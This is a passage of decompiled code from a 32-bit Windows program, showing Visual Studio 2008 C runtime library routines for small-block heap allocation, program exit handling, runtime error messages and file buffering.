      piVar1[1] = (int)puVar12;
      *(uint **)(puVar12[1] + 8) = puVar12;
      if (puVar12[1] == puVar12[2]) {
        cVar5 = *(char *)((int)puVar10 + uVar6 + 4);
        *(char *)((int)puVar10 + uVar6 + 4) = cVar5 + '\x01';
        bVar8 = (byte)puVar10;
        if (puVar10 < (uint *)0x20) {
          if (cVar5 == '\0') {
            *param_1 = *param_1 | 0x80000000U >> (bVar8 & 0x1f);
          }
          puVar10 = (uint *)(uVar6 + 0x44 + uVar14 * 4);
          *puVar10 = *puVar10 | 0x80000000U >> (bVar8 & 0x1f);
        }
        else {
          if (cVar5 == '\0') {
            param_1[1] = param_1[1] | 0x80000000U >> (bVar8 - 0x20 & 0x1f);
          }
          puVar10 = (uint *)(uVar6 + 0xc4 + uVar14 * 4);
          *puVar10 = *puVar10 | 0x80000000U >> (bVar8 - 0x20 & 0x1f);
        }
      }
    }
    *puVar12 = local_8;
    *(uint *)((local_8 - 4) + (int)puVar12) = local_8;
    *piVar4 = *piVar4 + -1;
    if (*piVar4 == 0) {
      if (DAT_00423e50 != (uint *)0x0) {
        VirtualFree((LPVOID)(DAT_00425784 * 0x8000 + DAT_00423e50[3]),0x8000,0x4000);
        DAT_00423e50[2] = DAT_00423e50[2] | 0x80000000U >> ((byte)DAT_00425784 & 0x1f);
        *(undefined4 *)(DAT_00423e50[4] + 0xc4 + DAT_00425784 * 4) = 0;
        *(char *)(DAT_00423e50[4] + 0x43) = *(char *)(DAT_00423e50[4] + 0x43) + -1;
        if (*(char *)(DAT_00423e50[4] + 0x43) == '\0') {
          DAT_00423e50[1] = DAT_00423e50[1] & 0xfffffffe;
        }
        if (DAT_00423e50[2] == 0xffffffff) {
          VirtualFree((LPVOID)DAT_00423e50[3],0,0x8000);
          HeapFree(DAT_00423e54,0,(LPVOID)DAT_00423e50[4]);
          _memmove(DAT_00423e50,DAT_00423e50 + 5,
                   (DAT_00425770 * 0x14 - (int)DAT_00423e50) + -0x14 + DAT_00425774);
          DAT_00425770 = DAT_00425770 + -1;
          if (DAT_00423e50 < param_1) {
            param_1 = param_1 + -5;
          }
          DAT_0042577c = DAT_00425774;
        }
      }
      DAT_00423e50 = param_1;
      DAT_00425784 = uVar14;
    }
  }
  return;
}



// Library Function - Single Match
//  ___sbh_alloc_new_region
// 
// Library: Visual Studio 2008 Release

undefined4 * ___sbh_alloc_new_region(void)

{
  LPVOID pvVar1;
  undefined4 *puVar2;
  
  if (DAT_00425770 == DAT_00425780) {
    pvVar1 = HeapReAlloc(DAT_00423e54,0,DAT_00425774,(DAT_00425780 + 0x10) * 0x14);
    if (pvVar1 == (LPVOID)0x0) {
      return (undefined4 *)0x0;
    }
    DAT_00425780 = DAT_00425780 + 0x10;
    DAT_00425774 = pvVar1;
  }
  puVar2 = (undefined4 *)(DAT_00425770 * 0x14 + (int)DAT_00425774);
  pvVar1 = HeapAlloc(DAT_00423e54,8,0x41c4);
  puVar2[4] = pvVar1;
  if (pvVar1 != (LPVOID)0x0) {
    pvVar1 = VirtualAlloc((LPVOID)0x0,0x100000,0x2000,4);
    puVar2[3] = pvVar1;
    if (pvVar1 != (LPVOID)0x0) {
      puVar2[2] = 0xffffffff;
      *puVar2 = 0;
      puVar2[1] = 0;
      DAT_00425770 = DAT_00425770 + 1;
      *(undefined4 *)puVar2[4] = 0xffffffff;
      return puVar2;
    }
    HeapFree(DAT_00423e54,0,(LPVOID)puVar2[4]);
  }
  return (undefined4 *)0x0;
}



// Library Function - Single Match
//  ___sbh_alloc_new_group
// 
// Library: Visual Studio 2008 Release

int __cdecl ___sbh_alloc_new_group(int param_1)

{
  char cVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  LPVOID pvVar5;
  int *piVar6;
  int iVar7;
  int iVar8;
  LPVOID lpAddress;
  
  iVar2 = *(int *)(param_1 + 0x10);
  iVar8 = 0;
  for (iVar3 = *(int *)(param_1 + 8); -1 < iVar3; iVar3 = iVar3 * 2) {
    iVar8 = iVar8 + 1;
  }
  iVar3 = iVar8 * 0x204 + 0x144 + iVar2;
  iVar7 = 0x3f;
  iVar4 = iVar3;
  do {
    *(int *)(iVar4 + 8) = iVar4;
    *(int *)(iVar4 + 4) = iVar4;
    iVar4 = iVar4 + 8;
    iVar7 = iVar7 + -1;
  } while (iVar7 != 0);
  lpAddress = (LPVOID)(iVar8 * 0x8000 + *(int *)(param_1 + 0xc));
  pvVar5 = VirtualAlloc(lpAddress,0x8000,0x1000,4);
  if (pvVar5 == (LPVOID)0x0) {
    iVar8 = -1;
  }
  else {
    if (lpAddress <= (LPVOID)((int)lpAddress + 0x7000U)) {
      piVar6 = (int *)((int)lpAddress + 0x10);
      iVar7 = ((uint)((int)(LPVOID)((int)lpAddress + 0x7000U) - (int)lpAddress) >> 0xc) + 1;
      do {
        piVar6[-2] = -1;
        piVar6[0x3fb] = -1;
        *piVar6 = (int)(piVar6 + 0x3ff);
        piVar6[-1] = 0xff0;
        piVar6[1] = (int)(piVar6 + -0x401);
        piVar6[0x3fa] = 0xff0;
        piVar6 = piVar6 + 0x400;
        iVar7 = iVar7 + -1;
      } while (iVar7 != 0);
    }
    *(int *)(iVar3 + 0x1fc) = (int)lpAddress + 0xc;
    *(int *)((int)lpAddress + 0x14) = iVar3 + 0x1f8;
    *(int *)(iVar3 + 0x200) = (int)lpAddress + 0x700c;
    *(int *)((int)lpAddress + 0x7010) = iVar3 + 0x1f8;
    *(undefined4 *)(iVar2 + 0x44 + iVar8 * 4) = 0;
    *(undefined4 *)(iVar2 + 0xc4 + iVar8 * 4) = 1;
    cVar1 = *(char *)(iVar2 + 0x43);
    *(char *)(iVar2 + 0x43) = cVar1 + '\x01';
    if (cVar1 == '\0') {
      *(uint *)(param_1 + 4) = *(uint *)(param_1 + 4) | 1;
    }
    *(uint *)(param_1 + 8) = *(uint *)(param_1 + 8) & ~(0x80000000U >> ((byte)iVar8 & 0x1f));
  }
  return iVar8;
}



// Library Function - Single Match
//  ___sbh_resize_block
// 
// Library: Visual Studio 2008 Release

undefined4 __cdecl ___sbh_resize_block(uint *param_1,int param_2,int param_3)

{
  char *pcVar1;
  uint *puVar2;
  int iVar3;
  int *piVar4;
  int iVar5;
  char cVar6;
  uint uVar7;
  uint *puVar8;
  int iVar9;
  uint uVar10;
  uint uVar11;
  uint uVar12;
  uint uVar13;
  uint local_c;
  
  uVar7 = param_1[4];
  uVar10 = param_2 - param_1[3] >> 0xf;
  iVar5 = uVar10 * 0x204 + 0x144 + uVar7;
  uVar12 = param_3 + 0x17U & 0xfffffff0;
  iVar9 = *(int *)(param_2 + -4) + -1;
  puVar8 = (uint *)(*(int *)(param_2 + -4) + -5 + param_2);
  uVar13 = *puVar8;
  if (iVar9 < (int)uVar12) {
    if (((uVar13 & 1) != 0) || ((int)(uVar13 + iVar9) < (int)uVar12)) {
      return 0;
    }
    local_c = ((int)uVar13 >> 4) - 1;
    if (0x3f < local_c) {
      local_c = 0x3f;
    }
    if (puVar8[1] == puVar8[2]) {
      if (local_c < 0x20) {
        pcVar1 = (char *)(local_c + 4 + uVar7);
        uVar11 = ~(0x80000000U >> ((byte)local_c & 0x1f));
        puVar2 = (uint *)(uVar7 + 0x44 + uVar10 * 4);
        *puVar2 = *puVar2 & uVar11;
        *pcVar1 = *pcVar1 + -1;
        if (*pcVar1 == '\0') {
          *param_1 = *param_1 & uVar11;
        }
      }
      else {
        pcVar1 = (char *)(local_c + 4 + uVar7);
        uVar11 = ~(0x80000000U >> ((byte)local_c - 0x20 & 0x1f));
        puVar2 = (uint *)(uVar7 + 0xc4 + uVar10 * 4);
        *puVar2 = *puVar2 & uVar11;
        *pcVar1 = *pcVar1 + -1;
        if (*pcVar1 == '\0') {
          param_1[1] = param_1[1] & uVar11;
        }
      }
    }
    *(uint *)(puVar8[2] + 4) = puVar8[1];
    *(uint *)(puVar8[1] + 8) = puVar8[2];
    iVar9 = uVar13 + (iVar9 - uVar12);
    if (0 < iVar9) {
      uVar13 = (iVar9 >> 4) - 1;
      iVar3 = param_2 + -4 + uVar12;
      if (0x3f < uVar13) {
        uVar13 = 0x3f;
      }
      iVar5 = iVar5 + uVar13 * 8;
      *(undefined4 *)(iVar3 + 4) = *(undefined4 *)(iVar5 + 4);
      *(int *)(iVar3 + 8) = iVar5;
      *(int *)(iVar5 + 4) = iVar3;
      *(int *)(*(int *)(iVar3 + 4) + 8) = iVar3;
      if (*(int *)(iVar3 + 4) == *(int *)(iVar3 + 8)) {
        cVar6 = *(char *)(uVar13 + 4 + uVar7);
        *(char *)(uVar13 + 4 + uVar7) = cVar6 + '\x01';
        if (uVar13 < 0x20) {
          if (cVar6 == '\0') {
            *param_1 = *param_1 | 0x80000000U >> ((byte)uVar13 & 0x1f);
          }
          puVar8 = (uint *)(uVar7 + 0x44 + uVar10 * 4);
        }
        else {
          if (cVar6 == '\0') {
            param_1[1] = param_1[1] | 0x80000000U >> ((byte)uVar13 - 0x20 & 0x1f);
          }
          puVar8 = (uint *)(uVar7 + 0xc4 + uVar10 * 4);
          uVar13 = uVar13 - 0x20;
        }
        *puVar8 = *puVar8 | 0x80000000U >> ((byte)uVar13 & 0x1f);
      }
      piVar4 = (int *)(param_2 + -4 + uVar12);
      *piVar4 = iVar9;
      *(int *)(iVar9 + -4 + (int)piVar4) = iVar9;
    }
    *(uint *)(param_2 + -4) = uVar12 + 1;
    *(uint *)(param_2 + -8 + uVar12) = uVar12 + 1;
  }
  else if ((int)uVar12 < iVar9) {
    param_3 = iVar9 - uVar12;
    *(uint *)(param_2 + -4) = uVar12 + 1;
    piVar4 = (int *)(param_2 + -4 + uVar12);
    uVar11 = (param_3 >> 4) - 1;
    piVar4[-1] = uVar12 + 1;
    if (0x3f < uVar11) {
      uVar11 = 0x3f;
    }
    if ((uVar13 & 1) == 0) {
      uVar12 = ((int)uVar13 >> 4) - 1;
      if (0x3f < uVar12) {
        uVar12 = 0x3f;
      }
      if (puVar8[1] == puVar8[2]) {
        if (uVar12 < 0x20) {
          pcVar1 = (char *)(uVar12 + 4 + uVar7);
          uVar12 = ~(0x80000000U >> ((byte)uVar12 & 0x1f));
          puVar2 = (uint *)(uVar7 + 0x44 + uVar10 * 4);
          *puVar2 = *puVar2 & uVar12;
          *pcVar1 = *pcVar1 + -1;
          if (*pcVar1 == '\0') {
            *param_1 = *param_1 & uVar12;
          }
        }
        else {
          pcVar1 = (char *)(uVar12 + 4 + uVar7);
          uVar12 = ~(0x80000000U >> ((byte)uVar12 - 0x20 & 0x1f));
          puVar2 = (uint *)(uVar7 + 0xc4 + uVar10 * 4);
          *puVar2 = *puVar2 & uVar12;
          *pcVar1 = *pcVar1 + -1;
          if (*pcVar1 == '\0') {
            param_1[1] = param_1[1] & uVar12;
          }
        }
      }
      *(uint *)(puVar8[2] + 4) = puVar8[1];
      *(uint *)(puVar8[1] + 8) = puVar8[2];
      param_3 = param_3 + uVar13;
      uVar11 = (param_3 >> 4) - 1;
      if (0x3f < uVar11) {
        uVar11 = 0x3f;
      }
    }
    iVar5 = iVar5 + uVar11 * 8;
    iVar9 = *(int *)(iVar5 + 4);
    piVar4[2] = iVar5;
    piVar4[1] = iVar9;
    *(int **)(iVar5 + 4) = piVar4;
    *(int **)(piVar4[1] + 8) = piVar4;
    if (piVar4[1] == piVar4[2]) {
      cVar6 = *(char *)(uVar11 + 4 + uVar7);
      *(char *)(uVar11 + 4 + uVar7) = cVar6 + '\x01';
      if (uVar11 < 0x20) {
        if (cVar6 == '\0') {
          *param_1 = *param_1 | 0x80000000U >> ((byte)uVar11 & 0x1f);
        }
        puVar8 = (uint *)(uVar7 + 0x44 + uVar10 * 4);
      }
      else {
        if (cVar6 == '\0') {
          param_1[1] = param_1[1] | 0x80000000U >> ((byte)uVar11 - 0x20 & 0x1f);
        }
        puVar8 = (uint *)(uVar7 + 0xc4 + uVar10 * 4);
        uVar11 = uVar11 - 0x20;
      }
      *puVar8 = *puVar8 | 0x80000000U >> ((byte)uVar11 & 0x1f);
    }
    *piVar4 = param_3;
    *(int *)(param_3 + -4 + (int)piVar4) = param_3;
  }
  return 1;
}



// Library Function - Single Match
//  ___sbh_alloc_block
// 
// Library: Visual Studio 2008 Release

int * __cdecl ___sbh_alloc_block(uint *param_1)

{
  int *piVar1;
  char *pcVar2;
  int *piVar3;
  char cVar4;
  int *piVar5;
  byte bVar6;
  uint uVar7;
  int iVar8;
  uint *puVar9;
  int iVar10;
  uint uVar11;
  int *piVar12;
  uint *puVar13;
  uint *puVar14;
  uint uVar15;
  int iVar16;
  uint local_c;
  int local_8;
  
  puVar9 = DAT_00425774 + DAT_00425770 * 5;
  uVar7 = (int)param_1 + 0x17U & 0xfffffff0;
  iVar8 = ((int)((int)param_1 + 0x17U) >> 4) + -1;
  bVar6 = (byte)iVar8;
  param_1 = DAT_0042577c;
  if (iVar8 < 0x20) {
    uVar15 = 0xffffffff >> (bVar6 & 0x1f);
    local_c = 0xffffffff;
  }
  else {
    uVar15 = 0;
    local_c = 0xffffffff >> (bVar6 - 0x20 & 0x1f);
  }
  for (; (param_1 < puVar9 && ((param_1[1] & local_c | *param_1 & uVar15) == 0));
      param_1 = param_1 + 5) {
  }
  puVar13 = DAT_00425774;
  if (param_1 == puVar9) {
    for (; (puVar13 < DAT_0042577c && ((puVar13[1] & local_c | *puVar13 & uVar15) == 0));
        puVar13 = puVar13 + 5) {
    }
    param_1 = puVar13;
    if (puVar13 == DAT_0042577c) {
      for (; (puVar13 < puVar9 && (puVar13[2] == 0)); puVar13 = puVar13 + 5) {
      }
      puVar14 = DAT_00425774;
      param_1 = puVar13;
      if (puVar13 == puVar9) {
        for (; (puVar14 < DAT_0042577c && (puVar14[2] == 0)); puVar14 = puVar14 + 5) {
        }
        param_1 = puVar14;
        if ((puVar14 == DAT_0042577c) &&
           (param_1 = ___sbh_alloc_new_region(), param_1 == (uint *)0x0)) {
          return (int *)0x0;
        }
      }
      iVar8 = ___sbh_alloc_new_group((int)param_1);
      *(int *)param_1[4] = iVar8;
      if (*(int *)param_1[4] == -1) {
        return (int *)0x0;
      }
    }
  }
  piVar5 = (int *)param_1[4];
  local_8 = *piVar5;
  if ((local_8 == -1) || ((piVar5[local_8 + 0x31] & local_c | piVar5[local_8 + 0x11] & uVar15) == 0)
     ) {
    local_8 = 0;
    puVar9 = (uint *)(piVar5 + 0x11);
    uVar11 = piVar5[0x31];
    while ((uVar11 & local_c | *puVar9 & uVar15) == 0) {
      local_8 = local_8 + 1;
      puVar13 = puVar9 + 0x21;
      puVar9 = puVar9 + 1;
      uVar11 = *puVar13;
    }
  }
  piVar3 = piVar5 + local_8 * 0x81 + 0x51;
  iVar8 = 0;
  uVar15 = piVar5[local_8 + 0x11] & uVar15;
  if (uVar15 == 0) {
    uVar15 = piVar5[local_8 + 0x31] & local_c;
    iVar8 = 0x20;
  }
  for (; -1 < (int)uVar15; uVar15 = uVar15 * 2) {
    iVar8 = iVar8 + 1;
  }
  piVar12 = (int *)piVar3[iVar8 * 2 + 1];
  iVar10 = *piVar12 - uVar7;
  iVar16 = (iVar10 >> 4) + -1;
  if (0x3f < iVar16) {
    iVar16 = 0x3f;
  }
  DAT_0042577c = param_1;
  if (iVar16 != iVar8) {
    if (piVar12[1] == piVar12[2]) {
      if (iVar8 < 0x20) {
        pcVar2 = (char *)((int)piVar5 + iVar8 + 4);
        uVar15 = ~(0x80000000U >> ((byte)iVar8 & 0x1f));
        piVar5[local_8 + 0x11] = uVar15 & piVar5[local_8 + 0x11];
        *pcVar2 = *pcVar2 + -1;
        if (*pcVar2 == '\0') {
          *param_1 = *param_1 & uVar15;
        }
      }
      else {
        pcVar2 = (char *)((int)piVar5 + iVar8 + 4);
        uVar15 = ~(0x80000000U >> ((byte)iVar8 - 0x20 & 0x1f));
        piVar5[local_8 + 0x31] = piVar5[local_8 + 0x31] & uVar15;
        *pcVar2 = *pcVar2 + -1;
        if (*pcVar2 == '\0') {
          param_1[1] = param_1[1] & uVar15;
        }
      }
    }
    *(int *)(piVar12[2] + 4) = piVar12[1];
    *(int *)(piVar12[1] + 8) = piVar12[2];
    if (iVar10 == 0) goto LAB_0040ee79;
    piVar1 = piVar3 + iVar16 * 2;
    iVar8 = piVar1[1];
    piVar12[2] = (int)piVar1;
    piVar12[1] = iVar8;
    piVar1[1] = (int)piVar12;
    *(int **)(piVar12[1] + 8) = piVar12;
    if (piVar12[1] == piVar12[2]) {
      cVar4 = *(char *)(iVar16 + 4 + (int)piVar5);
      *(char *)(iVar16 + 4 + (int)piVar5) = cVar4 + '\x01';
      bVar6 = (byte)iVar16;
      if (iVar16 < 0x20) {
        if (cVar4 == '\0') {
          *param_1 = *param_1 | 0x80000000U >> (bVar6 & 0x1f);
        }
        piVar5[local_8 + 0x11] = piVar5[local_8 + 0x11] | 0x80000000U >> (bVar6 & 0x1f);
      }
      else {
        if (cVar4 == '\0') {
          param_1[1] = param_1[1] | 0x80000000U >> (bVar6 - 0x20 & 0x1f);
        }
        piVar5[local_8 + 0x31] = piVar5[local_8 + 0x31] | 0x80000000U >> (bVar6 - 0x20 & 0x1f);
      }
    }
  }
  if (iVar10 != 0) {
    *piVar12 = iVar10;
    *(int *)(iVar10 + -4 + (int)piVar12) = iVar10;
  }
LAB_0040ee79:
  piVar12 = (int *)((int)piVar12 + iVar10);
  *piVar12 = uVar7 + 1;
  *(uint *)((int)piVar12 + (uVar7 - 4)) = uVar7 + 1;
  iVar8 = *piVar3;
  *piVar3 = iVar8 + 1;
  if (((iVar8 == 0) && (param_1 == DAT_00423e50)) && (local_8 == DAT_00425784)) {
    DAT_00423e50 = (uint *)0x0;
  }
  *piVar5 = local_8;
  return piVar12 + 1;
}



// Library Function - Single Match
//  __heap_init
// 
// Library: Visual Studio 2008 Release

int __cdecl __heap_init(void)

{
  int in_stack_00000004;
  
  DAT_00423e54 = HeapCreate((uint)(in_stack_00000004 == 0),0x1000,0);
  if (DAT_00423e54 == (HANDLE)0x0) {
    return 0;
  }
  DAT_0042576c = 1;
  return 1;
}



// Library Function - Single Match
//  __crt_waiting_on_module_handle
// 
// Library: Visual Studio 2008 Release

void __cdecl __crt_waiting_on_module_handle(LPCWSTR param_1)

{
  HMODULE pHVar1;
  DWORD dwMilliseconds;
  
  dwMilliseconds = 1000;
  do {
    Sleep(dwMilliseconds);
    pHVar1 = GetModuleHandleW(param_1);
    dwMilliseconds = dwMilliseconds + 1000;
    if (60000 < dwMilliseconds) {
      return;
    }
  } while (pHVar1 == (HMODULE)0x0);
  return;
}



// Library Function - Single Match
//  __amsg_exit
// 
// Library: Visual Studio 2008 Release

void __cdecl __amsg_exit(int param_1)

{
  code *pcVar1;
  
  __FF_MSGBANNER();
  __NMSG_WRITE(param_1);
  pcVar1 = (code *)__decode_pointer((int)PTR___exit_004225ac);
  (*pcVar1)(0xff);
  return;
}



// Library Function - Single Match
//  ___crtCorExitProcess
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl ___crtCorExitProcess(int param_1)

{
  HMODULE hModule;
  FARPROC pFVar1;
  
  hModule = GetModuleHandleW(u_mscoree_dll_0041c340);
  if (hModule != (HMODULE)0x0) {
    pFVar1 = GetProcAddress(hModule,s_CorExitProcess_0041c330);
    if (pFVar1 != (FARPROC)0x0) {
      (*pFVar1)(param_1);
    }
  }
  return;
}



// Library Function - Single Match
//  ___crtExitProcess
// 
// Library: Visual Studio 2008 Release

void __cdecl ___crtExitProcess(int param_1)

{
  ___crtCorExitProcess(param_1);
                    // WARNING: Subroutine does not return
  ExitProcess(param_1);
}



void FUN_0040ef88(void)

{
  __lock(8);
  return;
}



void FUN_0040ef91(void)

{
  FUN_0040e2eb(8);
  return;
}



// Library Function - Single Match
//  __initterm
// 
// Library: Visual Studio 2008 Release

void __cdecl __initterm(undefined **param_1)

{
  code **in_EAX;
  
  for (; in_EAX < param_1; in_EAX = in_EAX + 1) {
    if (*in_EAX != (code *)0x0) {
      (**in_EAX)();
    }
  }
  return;
}



// Library Function - Single Match
//  __initterm_e
// 
// Library: Visual Studio 2008 Release

void __cdecl __initterm_e(undefined **param_1,undefined **param_2)

{
  int iVar1;
  
  iVar1 = 0;
  while ((param_1 < param_2 && (iVar1 == 0))) {
    if ((code *)*param_1 != (code *)0x0) {
      iVar1 = (*(code *)*param_1)();
    }
    param_1 = (code **)param_1 + 1;
  }
  return;
}



// Library Function - Single Match
//  __cinit
// 
// Library: Visual Studio 2008 Release

int __cdecl __cinit(int param_1)

{
  BOOL BVar1;
  int iVar2;
  
  if (PTR___fpmath_00420020 != (undefined *)0x0) {
    BVar1 = __IsNonwritableInCurrentImage((PBYTE)&PTR___fpmath_00420020);
    if (BVar1 != 0) {
      (*(code *)PTR___fpmath_00420020)(param_1);
    }
  }
  __initp_misc_cfltcvt_tab();
  iVar2 = __initterm_e((undefined **)&DAT_0041c218,(undefined **)&DAT_0041c230);
  if (iVar2 == 0) {
    _atexit((_func_4879 *)&LAB_004137e5);
    __initterm((undefined **)&DAT_0041c214);
    if (DAT_00425768 != (code *)0x0) {
      BVar1 = __IsNonwritableInCurrentImage((PBYTE)&DAT_00425768);
      if (BVar1 != 0) {
        (*DAT_00425768)(0,2,0);
      }
    }
    iVar2 = 0;
  }
  return iVar2;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// WARNING: Removing unreachable block (ram,0x0040f17d)
// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  _doexit
// 
// Library: Visual Studio 2008 Release

void __cdecl _doexit(int param_1,int param_2,int param_3)

{
  int *piVar1;
  int *piVar2;
  int iVar3;
  code *pcVar4;
  int *piVar5;
  int *piVar6;
  int *local_2c;
  int *local_24;
  int *local_20;
  
  __lock(8);
  if (DAT_00423e88 != 1) {
    _DAT_00423e84 = 1;
    DAT_00423e80 = (undefined)param_3;
    if (param_2 == 0) {
      piVar1 = (int *)__decode_pointer(DAT_00425760);
      if (piVar1 != (int *)0x0) {
        piVar2 = (int *)__decode_pointer(DAT_0042575c);
        local_2c = piVar1;
        local_24 = piVar2;
        local_20 = piVar1;
        while (piVar2 = piVar2 + -1, piVar1 <= piVar2) {
          iVar3 = __encoded_null();
          if (*piVar2 != iVar3) {
            if (piVar2 < piVar1) break;
            pcVar4 = (code *)__decode_pointer(*piVar2);
            iVar3 = __encoded_null();
            *piVar2 = iVar3;
            (*pcVar4)();
            piVar5 = (int *)__decode_pointer(DAT_00425760);
            piVar6 = (int *)__decode_pointer(DAT_0042575c);
            if ((local_20 != piVar5) || (piVar1 = local_2c, local_24 != piVar6)) {
              piVar2 = piVar6;
              piVar1 = piVar5;
              local_2c = piVar5;
              local_24 = piVar6;
              local_20 = piVar5;
            }
          }
        }
      }
      __initterm((undefined **)&DAT_0041c240);
    }
    __initterm((undefined **)&DAT_0041c248);
  }
  FUN_0040f177();
  if (param_3 == 0) {
    DAT_00423e88 = 1;
    FUN_0040e2eb(8);
    ___crtExitProcess(param_1);
    return;
  }
  return;
}



void FUN_0040f177(void)

{
  int unaff_EBP;
  
  if (*(int *)(unaff_EBP + 0x10) != 0) {
    FUN_0040e2eb(8);
  }
  return;
}



// Library Function - Single Match
//  _exit
// 
// Library: Visual Studio 2008 Release

void __cdecl _exit(int _Code)

{
  _doexit(_Code,0,0);
  return;
}



// Library Function - Single Match
//  __exit
// 
// Library: Visual Studio 2008 Release

void __cdecl __exit(int param_1)

{
  _doexit(param_1,1,0);
  return;
}



// Library Function - Single Match
//  __cexit
// 
// Library: Visual Studio 2008 Release

void __cdecl __cexit(void)

{
  _doexit(0,0,1);
  return;
}



// Library Function - Single Match
//  __init_pointers
// 
// Library: Visual Studio 2008 Release

void __cdecl __init_pointers(void)

{
  undefined4 uVar1;
  
  uVar1 = __encoded_null();
  FUN_0040f408(uVar1);
  FUN_004143c3(uVar1);
  FUN_0040cb10(uVar1);
  FUN_00414e5e(uVar1);
  FUN_00414e4f(uVar1);
  __initp_misc_winsig(uVar1);
  FUN_0041738a();
  __initp_eh_hooks();
  PTR___exit_004225ac = (undefined *)__encode_pointer(0x40f1a2);
  return;
}



// Library Function - Single Match
//  __NMSG_WRITE
// 
// Library: Visual Studio 2008 Release

void __cdecl __NMSG_WRITE(int param_1)

{
  char **ppcVar1;
  uint uVar2;
  int iVar3;
  errno_t eVar4;
  DWORD DVar5;
  size_t sVar6;
  HANDLE hFile;
  DWORD *lpNumberOfBytesWritten;
  LPOVERLAPPED lpOverlapped;
  DWORD local_c;
  uint local_8;
  
  local_8 = 0;
  do {
    if (param_1 == (&DAT_004225b0)[local_8 * 2]) break;
    local_8 = local_8 + 1;
  } while (local_8 < 0x17);
  uVar2 = local_8;
  if (local_8 < 0x17) {
    iVar3 = __set_error_mode(3);
    if ((iVar3 != 1) && ((iVar3 = __set_error_mode(3), iVar3 != 0 || (DAT_00422040 != 1)))) {
      if (param_1 == 0xfc) {
        return;
      }
      eVar4 = _strcpy_s(&DAT_00423e90,0x314,s_Runtime_Error__Program__0041c900);
      if (eVar4 != 0) {
                    // WARNING: Subroutine does not return
        __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      }
      DAT_00423fad = 0;
      DVar5 = GetModuleFileNameA((HMODULE)0x0,&DAT_00423ea9,0x104);
      if ((DVar5 == 0) &&
         (eVar4 = _strcpy_s(&DAT_00423ea9,0x2fb,s_<program_name_unknown>_0041c8e8), eVar4 != 0)) {
                    // WARNING: Subroutine does not return
        __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      }
      sVar6 = _strlen(&DAT_00423ea9);
      if (0x3c < sVar6 + 1) {
        sVar6 = _strlen(&DAT_00423ea9);
        eVar4 = _strncpy_s((char *)(sVar6 + 0x423e6e),
                           (int)&DAT_004241a4 - (int)(char *)(sVar6 + 0x423e6e),&DAT_0041c8e4,3);
        if (eVar4 != 0) {
                    // WARNING: Subroutine does not return
          __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
        }
      }
      eVar4 = _strcat_s(&DAT_00423e90,0x314,&DAT_0041c8e0);
      if (eVar4 == 0) {
        eVar4 = _strcat_s(&DAT_00423e90,0x314,*(char **)(local_8 * 8 + 0x4225b4));
        if (eVar4 == 0) {
          ___crtMessageBoxA(&DAT_00423e90,s_Microsoft_Visual_C___Runtime_Lib_0041c8b8,0x12010);
          return;
        }
                    // WARNING: Subroutine does not return
        __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      }
                    // WARNING: Subroutine does not return
      __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    }
    hFile = GetStdHandle(0xfffffff4);
    if ((hFile != (HANDLE)0x0) && (hFile != (HANDLE)0xffffffff)) {
      lpOverlapped = (LPOVERLAPPED)0x0;
      lpNumberOfBytesWritten = &local_c;
      ppcVar1 = (char **)(uVar2 * 8 + 0x4225b4);
      sVar6 = _strlen(*ppcVar1);
      WriteFile(hFile,*ppcVar1,sVar6,lpNumberOfBytesWritten,lpOverlapped);
    }
  }
  return;
}



// Library Function - Single Match
//  __FF_MSGBANNER
// 
// Library: Visual Studio 2008 Release

void __cdecl __FF_MSGBANNER(void)

{
  int iVar1;
  
  iVar1 = __set_error_mode(3);
  if (iVar1 != 1) {
    iVar1 = __set_error_mode(3);
    if (iVar1 != 0) {
      return;
    }
    if (DAT_00422040 != 1) {
      return;
    }
  }
  __NMSG_WRITE(0xfc);
  __NMSG_WRITE(0xff);
  return;
}



void __cdecl FUN_0040f408(undefined4 param_1)

{
  DAT_004241a4 = param_1;
  return;
}



// Library Function - Single Match
//  __callnewh
// 
// Library: Visual Studio 2008 Release

int __cdecl __callnewh(size_t _Size)

{
  code *pcVar1;
  int iVar2;
  
  pcVar1 = (code *)__decode_pointer(DAT_004241a4);
  if (pcVar1 != (code *)0x0) {
    iVar2 = (*pcVar1)(_Size);
    if (iVar2 != 0) {
      return 1;
    }
  }
  return 0;
}



// Library Function - Single Match
//  __filbuf
// 
// Library: Visual Studio 2008 Release

int __cdecl __filbuf(FILE *_File)

{
  byte bVar1;
  int *piVar2;
  int iVar3;
  uint uVar4;
  undefined *puVar5;
  char *_DstBuf;
  
  if (_File == (FILE *)0x0) {
    piVar2 = __errno();
    *piVar2 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  else {
    uVar4 = _File->_flag;
    if (((uVar4 & 0x83) != 0) && ((uVar4 & 0x40) == 0)) {
      if ((uVar4 & 2) == 0) {
        _File->_flag = uVar4 | 1;
        if ((uVar4 & 0x10c) == 0) {
          __getbuf(_File);
        }
        else {
          _File->_ptr = _File->_base;
        }
        uVar4 = _File->_bufsiz;
        _DstBuf = _File->_base;
        iVar3 = __fileno(_File);
        iVar3 = __read(iVar3,_DstBuf,uVar4);
        _File->_cnt = iVar3;
        if ((iVar3 != 0) && (iVar3 != -1)) {
          if ((*(byte *)&_File->_flag & 0x82) == 0) {
            iVar3 = __fileno(_File);
            if ((iVar3 == -1) || (iVar3 = __fileno(_File), iVar3 == -2)) {
              puVar5 = &DAT_00422448;
            }
            else {
              iVar3 = __fileno(_File);
              uVar4 = __fileno(_File);
              puVar5 = (undefined *)((uVar4 & 0x1f) * 0x40 + (&DAT_004257a0)[iVar3 >> 5]);
            }
            if ((puVar5[4] & 0x82) == 0x82) {
              _File->_flag = _File->_flag | 0x2000;
            }
          }
          if (((_File->_bufsiz == 0x200) && ((_File->_flag & 8U) != 0)) &&
             ((_File->_flag & 0x400U) == 0)) {
